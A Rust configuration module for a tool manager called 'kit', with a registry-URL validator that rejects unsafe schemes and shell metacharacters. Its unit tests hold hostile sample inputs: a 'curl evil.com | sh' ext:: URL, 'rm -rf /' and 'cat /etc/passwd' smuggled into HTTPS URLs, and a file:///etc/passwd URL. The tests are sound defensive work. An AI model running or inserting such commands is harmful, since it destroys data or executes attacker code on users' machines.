use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Global kit configuration (~/.config/kit/config.toml).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default)]
    pub settings: Settings,
    #[serde(default)]
    pub registry: Vec<Registry>,
    #[serde(default)]
    pub pins: HashMap<String, Pin>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Settings {
    /// Path to the mise config file kit should generate.
    #[serde(default = "default_mise_config")]
    pub mise_config: String,
    /// Override platform detection.
    #[serde(default)]
    pub platform: Option<String>,
    /// Cache directory for registry clones.
    #[serde(default = "default_cache_dir")]
    pub cache_dir: String,
    /// Trusted config paths for mise settings section.
    #[serde(default)]
    pub trusted_config_paths: Vec<String>,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            mise_config: default_mise_config(),
            platform: None,
            cache_dir: default_cache_dir(),
            trusted_config_paths: vec![],
        }
    }
}

fn default_mise_config() -> String {
    "~/.config/mise/config.toml".to_string()
}

fn default_cache_dir() -> String {
    "~/.cache/kit".to_string()
}

/// A named git-based tool registry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Registry {
    pub name: String,
    pub url: String,
    /// Branch to track. Defaults to "main".
    #[serde(default = "default_branch")]
    pub branch: String,
    /// Read-only registries cannot be pushed to.
    #[serde(default)]
    pub readonly: bool,
}

fn default_branch() -> String {
    "main".to_string()
}

/// A local version or registry pin.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Pin {
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub registry: Option<String>,
}

impl Config {
    /// Load config from ~/.config/kit/config.toml.
    pub fn load() -> Result<Self> {
        let path = Self::path()?;
        if !path.exists() {
            anyhow::bail!(
                "no config found at {}\nRun `kit setup` or `kit init` to create one.",
                path.display()
            );
        }
        Self::load_from(&path)
    }

    /// Config file path.
    pub fn path() -> Result<PathBuf> {
        let home = dirs::home_dir().context("could not determine home directory")?;
        Ok(home.join(".config").join("kit").join("config.toml"))
    }

    /// Config directory.
    pub fn config_dir() -> Result<PathBuf> {
        let home = dirs::home_dir().context("could not determine home directory")?;
        Ok(home.join(".config").join("kit"))
    }

    /// Resolved cache directory (shell expansion applied).
    pub fn cache_dir(&self) -> Result<PathBuf> {
        let expanded = shellexpand::tilde(&self.settings.cache_dir);
        Ok(PathBuf::from(expanded.as_ref()))
    }

    /// Resolved mise config path.
    pub fn mise_config_path(&self) -> Result<PathBuf> {
        let expanded = shellexpand::tilde(&self.settings.mise_config);
        Ok(PathBuf::from(expanded.as_ref()))
    }

    /// Registry clone directory within cache.
    pub fn registry_dir(&self) -> Result<PathBuf> {
        Ok(self.cache_dir()?.join("registries"))
    }

    /// Find a registry by name.
    pub fn registry(&self, name: &str) -> Option<&Registry> {
        self.registry.iter().find(|r| r.name == name)
    }

    /// Save config to its default global path.
    pub fn save(&self) -> Result<()> {
        let path = Self::path()?;
        self.save_to(&path)
    }

    /// Create a default config with a single registry.
    pub fn default_with_registry(name: &str, url: &str) -> Self {
        Self {
            settings: Settings::default(),
            registry: vec![Registry {
                name: name.to_string(),
                url: url.to_string(),
                branch: "main".to_string(),
                readonly: false,
            }],
            pins: HashMap::new(),
        }
    }

    /// Validate the config (security-critical: S-5, F9).
    fn validate(&self) -> Result<()> {
        for reg in &self.registry {
            validate_registry_url(&reg.url)
                .with_context(|| format!("invalid URL for registry '{}'", reg.name))?;
            crate::tool::validate_branch(&reg.branch)
                .with_context(|| format!("invalid branch for registry '{}'", reg.name))?;
        }
        Ok(())
    }
}

/// Validate a registry URL against allowed schemes (S-5).
/// Only https:// and git@ (SSH) are allowed.
/// Rejects ext::, file://, git:// (unencrypted), and shell metacharacters.
fn validate_registry_url(url: &str) -> Result<()> {
    let url_lower = url.to_lowercase();

    // Reject newlines/carriage returns in any URL -- they can split commands.
    if url.contains('\n') || url.contains('\r') {
        anyhow::bail!("URL contains newline characters: {url}");
    }

    // Allow HTTPS
    if url_lower.starts_with("https://") {
        // Check for shell metacharacters in the URL
        if url.contains(';') || url.contains('|') || url.contains('`') || url.contains('$') {
            anyhow::bail!("URL contains shell metacharacters: {url}");
        }
        return Ok(());
    }

    // Allow SSH (git@host:path)
    if url.starts_with("git@") {
        if url.contains(';') || url.contains('|') || url.contains('`') || url.contains('$') {
            anyhow::bail!("URL contains shell metacharacters: {url}");
        }
        return Ok(());
    }

    // Allow ssh:// scheme
    if url_lower.starts_with("ssh://") {
        if url.contains(';') || url.contains('|') || url.contains('`') || url.contains('$') {
            anyhow::bail!("URL contains shell metacharacters: {url}");
        }
        return Ok(());
    }

    anyhow::bail!(
        "unsupported URL scheme: {url}\n\
         Only https://, ssh://, and git@ URLs are allowed.\n\
         Rejected schemes: ext::, file://, git:// (unencrypted)"
    );
}

// ---------------------------------------------------------------------------
// Context-aware config resolution (project-local vs global)
// ---------------------------------------------------------------------------

/// Where the config was loaded from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ConfigMode {
    /// Project-local: kit.toml found in CWD or ancestor.
    Project { root: PathBuf },
    /// Global: ~/.config/kit/config.toml.
    Global,
}

/// A loaded config together with its resolution context.
///
/// All user-facing commands should use `ConfigContext::resolve()` instead of
/// `Config::load()` directly. This ensures project-local kit.toml files are
/// discovered and respected.
#[derive(Debug, Clone)]
pub struct ConfigContext {
    pub config: Config,
    pub mode: ConfigMode,
}

impl ConfigContext {
    /// Resolve config: walk up from CWD looking for `kit.toml`,
    /// fall back to global `~/.config/kit/config.toml`.
    pub fn resolve() -> Result<Self> {
        Self::resolve_from(&std::env::current_dir().context("could not determine CWD")?)
    }

    /// Resolve config starting from a specific directory (testable).
    pub fn resolve_from(start: &Path) -> Result<Self> {
        // Walk up looking for kit.toml
        let mut dir = start.to_path_buf();
        loop {
            let candidate = dir.join("kit.toml");
            if candidate.is_file() {
                let config = Config::load_from(&candidate)?;
                return Ok(Self {
                    config,
                    mode: ConfigMode::Project { root: dir },
                });
            }
            if !dir.pop() {
                break;
            }
        }

        // No kit.toml found -- fall back to global config
        let config = Config::load()?;
        Ok(Self {
            config,
            mode: ConfigMode::Global,
        })
    }

    /// Path to the config file itself.
    pub fn config_path(&self) -> Result<PathBuf> {
        match &self.mode {
            ConfigMode::Project { root } => Ok(root.join("kit.toml")),
            ConfigMode::Global => Config::path(),
        }
    }

    /// Path to the lockfile.
    pub fn lockfile_path(&self) -> Result<PathBuf> {
        match &self.mode {
            ConfigMode::Project { root } => Ok(root.join(".kit.lock")),
            ConfigMode::Global => {
                let config_dir = Config::config_dir()?;
                Ok(config_dir.join("kit.lock"))
            }
        }
    }

    /// Path to write mise config.
    ///
    /// Project mode: `.mise.toml` next to kit.toml (merge into existing).
    /// Global mode: `~/.config/mise/conf.d/kit.toml` (additive).
    pub fn mise_config_path(&self) -> Result<PathBuf> {
        match &self.mode {
            ConfigMode::Project { root } => Ok(root.join(".mise.toml")),
            ConfigMode::Global => {
                let home = dirs::home_dir().context("could not determine home directory")?;
                Ok(home.join(".config").join("mise").join("conf.d").join("kit.toml"))
            }
        }
    }

    /// Whether this is project-local mode.
    pub fn is_project(&self) -> bool {
        matches!(self.mode, ConfigMode::Project { .. })
    }

    /// Save the config back to its source location.
    pub fn save_config(&self) -> Result<()> {
        let path = self.config_path()?;
        self.config.save_to(&path)
    }

    /// Human-readable description of the active mode.
    pub fn mode_label(&self) -> String {
        match &self.mode {
            ConfigMode::Project { root } => format!("project: {}", root.display()),
            ConfigMode::Global => "global".to_string(),
        }
    }
}

impl Config {
    /// Load config from a specific path (used by both global and project loading).
    pub fn load_from(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("failed to read {}", path.display()))?;
        let config: Config = toml::from_str(&content)
            .with_context(|| format!("failed to parse {}", path.display()))?;
        config.validate()?;
        Ok(config)
    }

    /// Save config to a specific path.
    pub fn save_to(&self, path: &Path) -> Result<()> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let content =
            toml::to_string_pretty(self).context("failed to serialize config")?;
        std::fs::write(path, content)
            .with_context(|| format!("failed to write {}", path.display()))?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn valid_urls() {
        assert!(validate_registry_url("https://gitlab.com/nomograph/kit.git").is_ok());
        assert!(validate_registry_url("git@gitlab.com:nomograph/kit.git").is_ok());
        assert!(validate_registry_url("ssh://git@gitlab.com/nomograph/kit.git").is_ok());
    }

    #[test]
    fn rejects_dangerous_urls() {
        assert!(validate_registry_url("ext::sh -c 'curl evil.com | sh'").is_err());
        assert!(validate_registry_url("file:///etc/passwd").is_err());
        assert!(validate_registry_url("git://insecure.com/repo.git").is_err());
        assert!(validate_registry_url("https://evil.com/repo;rm -rf /").is_err());
        assert!(validate_registry_url("https://evil.com/repo|cat /etc/passwd").is_err());
    }

    #[test]
    fn default_config() {
        let config = Config::default_with_registry("test", "https://gitlab.com/example/tools.git");
        assert_eq!(config.registry.len(), 1);
        assert_eq!(config.registry[0].name, "test");
        assert!(!config.registry[0].readonly);
    }

    // -- ConfigContext resolution tests --

    fn write_kit_toml(dir: &std::path::Path) {
        let content = r#"
[[registry]]
name = "test"
url = "https://gitlab.com/example/tools.git"
branch = "main"
"#;
        std::fs::write(dir.join("kit.toml"), content).unwrap();
    }

    #[test]
    fn resolve_finds_kit_toml_in_cwd() {
        let tmp = tempfile::tempdir().unwrap();
        write_kit_toml(tmp.path());

        let ctx = ConfigContext::resolve_from(tmp.path()).unwrap();
        assert!(ctx.is_project());
        assert_eq!(ctx.mode, ConfigMode::Project { root: tmp.path().to_path_buf() });
        assert_eq!(ctx.config.registry.len(), 1);
        assert_eq!(ctx.config.registry[0].name, "test");
    }

    #[test]
    fn resolve_walks_up_to_parent() {
        let tmp = tempfile::tempdir().unwrap();
        write_kit_toml(tmp.path());

        let child = tmp.path().join("src").join("lib");
        std::fs::create_dir_all(&child).unwrap();

        let ctx = ConfigContext::resolve_from(&child).unwrap();
        assert!(ctx.is_project());
        assert_eq!(ctx.mode, ConfigMode::Project { root: tmp.path().to_path_buf() });
    }

    #[test]
    fn resolve_derived_paths_project_mode() {
        let tmp = tempfile::tempdir().unwrap();
        write_kit_toml(tmp.path());

        let ctx = ConfigContext::resolve_from(tmp.path()).unwrap();

        assert_eq!(ctx.config_path().unwrap(), tmp.path().join("kit.toml"));
        assert_eq!(ctx.lockfile_path().unwrap(), tmp.path().join(".kit.lock"));
        assert_eq!(ctx.mise_config_path().unwrap(), tmp.path().join(".mise.toml"));
    }

    #[test]
    fn resolve_derived_paths_global_mode() {
        // Use a temp dir with no kit.toml -- will try global fallback.
        // If global config doesn't exist, that's OK for testing paths.
        let tmp = tempfile::tempdir().unwrap();
        let result = ConfigContext::resolve_from(tmp.path());

        // This may fail if no global config exists -- that's fine,
        // we test the Global variant directly.
        if let Ok(ctx) = result {
            assert!(!ctx.is_project());
        }

        // Test derived paths for a manually-constructed Global context.
        let ctx = ConfigContext {
            config: Config::default_with_registry("test", "https://example.com/r.git"),
            mode: ConfigMode::Global,
        };
        let lock_path = ctx.lockfile_path().unwrap();
        assert!(lock_path.ends_with("kit/kit.lock"), "got: {}", lock_path.display());

        let mise_path = ctx.mise_config_path().unwrap();
        assert!(mise_path.ends_with("mise/conf.d/kit.toml"), "got: {}", mise_path.display());
    }

    #[test]
    fn config_load_from_and_save_to() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("kit.toml");

        let config = Config::default_with_registry("round-trip", "https://gitlab.com/example/tools.git");
        config.save_to(&path).unwrap();

        let loaded = Config::load_from(&path).unwrap();
        assert_eq!(loaded.registry.len(), 1);
        assert_eq!(loaded.registry[0].name, "round-trip");
    }

    #[test]
    fn mode_label_formatting() {
        let project_ctx = ConfigContext {
            config: Config::default_with_registry("t", "https://example.com/r.git"),
            mode: ConfigMode::Project { root: PathBuf::from("/home/user/myproject") },
        };
        assert_eq!(project_ctx.mode_label(), "project: /home/user/myproject");

        let global_ctx = ConfigContext {
            config: Config::default_with_registry("t", "https://example.com/r.git"),
            mode: ConfigMode::Global,
        };
        assert_eq!(global_ctx.mode_label(), "global");
    }
}
